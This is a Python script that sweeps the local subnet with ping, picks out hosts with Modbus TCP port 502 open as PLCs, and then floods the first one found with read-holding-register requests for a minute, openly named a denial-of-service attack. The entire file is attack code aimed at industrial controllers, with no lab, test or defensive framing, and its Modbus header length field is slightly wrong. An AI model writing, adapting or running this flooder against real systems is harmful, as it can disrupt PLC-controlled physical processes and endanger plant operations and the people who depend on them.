import socket
import time
import struct
import sys
import os

# Configuration
TARGET_PORT = 502  # Default Modbus port.  Adjust if necessary.
FLOOD_DURATION = 60  # Duration of the flood in seconds
PACKET_SEND_RATE = 0.001  # Send a packet every this many seconds (adjust for intensity)
MODBUS_FUNCTION_CODE = 0x03  # Read Holding Registers (a common and potentially impactful choice)
REGISTER_START = 0  # Start address for the read (adjust if needed)
REGISTER_COUNT = 10  # Number of registers to read (adjust if needed)
# Helper function to construct a Modbus TCP packet (without IP address)
def create_modbus_packet(transaction_id, unit_id, function_code, start_address, quantity):
    """Creates a Modbus TCP request packet.

    Args:
        transaction_id: A unique transaction identifier (increment for each request).
        unit_id: The Modbus unit identifier.
        function_code: The Modbus function code (e.g., 0x03 for Read Holding Registers).
        start_address: The starting address of the registers to read.
        quantity: The number of registers to read.

    Returns:
        A byte string containing the Modbus TCP request packet.
    """
    protocol_id = 0  # Modbus TCP Protocol ID is always 0
    length = 6  # Fixed length for the Modbus TCP header
    pdu_length = 5  # Length of the Protocol Data Unit (Function Code + Data)

    # Construct the header
    header = struct.pack(">HHHB", transaction_id, protocol_id, pdu_length, unit_id)

    # Construct the Protocol Data Unit (PDU)
    pdu = struct.pack(">BHH", function_code, start_address, quantity)

    # Combine header and PDU to create the complete packet
    packet = header + pdu

    return packet

def find_plc_ip_address():
    """
    Attempts to discover the PLC's IP address by scanning the local network.

    This is a simplified approach and may not work in all network configurations.
    It relies on pinging a range of IP addresses and checking for responses.
    A more sophisticated approach would involve using network discovery protocols
    or analyzing network traffic.

    Returns:
        The PLC's IP address as a string, or None if not found.
    """
    # Get the local IP address
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"Local IP Address: {local_ip}")
    # Determine the network address (e.g., 192.168.1.0)
    network_prefix = ".".join(local_ip.split(".")[:-1]) + "."
    print(f"Network Prefix: {network_prefix}")

    # Scan a range of IP addresses (e.g., 192.168.1.1 to 192.168.1.254)
    for i in range(1, 255):  # Adjust range if necessary
        target_ip = network_prefix + str(i)
        if target_ip == local_ip:
            continue  # Skip the local machine's IP

        # Ping the target IP address
        response = os.system("ping -n 1 -w 100 " + target_ip + " > nul 2>&1")  # Windows ping command
        # response = os.system("ping -c 1 -W 0.1 " + target_ip + " > /dev/null 2>&1") # Linux ping command (if running this on linux)

        if response == 0:
            print(f"Possible PLC IP Address: {target_ip}")
            # Attempt a Modbus connection to confirm.
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1) #set timeout to prevent hanging
                sock.connect((target_ip, TARGET_PORT))
                sock.close()
                print(f"Confirmed PLC IP Address: {target_ip}")
                return target_ip  # Found the PLC
            except socket.error as e:
                print(f"No Modbus service found on {target_ip}")
                continue

    print("PLC IP address not found on the local network.")
    return None

def modbus_dos_attack(target_ip, target_port, flood_duration, packet_send_rate):
    """
    Performs a Denial-of-Service attack against a Modbus TCP server.

    Args:
        target_ip: The IP address of the Modbus TCP server.
        target_port: The port number of the Modbus TCP server.
        flood_duration: The duration of the attack in seconds.
        packet_send_rate: The rate at which packets are sent (seconds between packets).
    """
    start_time = time.time()
    transaction_id = 1  # Start with transaction ID 1
    unit_id = 1  # Modbus Unit ID

    print(f"Starting DoS attack against {target_ip}:{target_port} for {flood_duration} seconds...")

    try:
        while time.time() - start_time < flood_duration:
            # Create a Modbus TCP packet
            packet = create_modbus_packet(transaction_id, unit_id, MODBUS_FUNCTION_CODE, REGISTER_START, REGISTER_COUNT)

            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                # Connect to the target
                sock.connect((target_ip, target_port))

                # Send the packet
                sock.sendall(packet)
                print(f"Sent packet {transaction_id} to {target_ip}:{target_port}")

                # Increment the transaction ID
                transaction_id += 1

            except socket.error as e:
                print(f"Socket error: {e}")
                # Potentially handle connection errors more gracefully, like retrying or waiting.

            finally:
                # Close the socket
                sock.close()

            # Wait before sending the next packet
            time.sleep(packet_send_rate)

    except KeyboardInterrupt:
        print("Attack interrupted by user.")

    print("DoS attack finished.")


if __name__ == "__main__":
    # 1. Find the PLC IP Address (or use a hardcoded value)
    plc_ip = find_plc_ip_address()
    if plc_ip is None:
        print("Could not find PLC IP address.  Exiting.")
        sys.exit(1)

    # 2. Perform the DoS attack
    modbus_dos_attack(plc_ip, TARGET_PORT, FLOOD_DURATION, PACKET_SEND_RATE)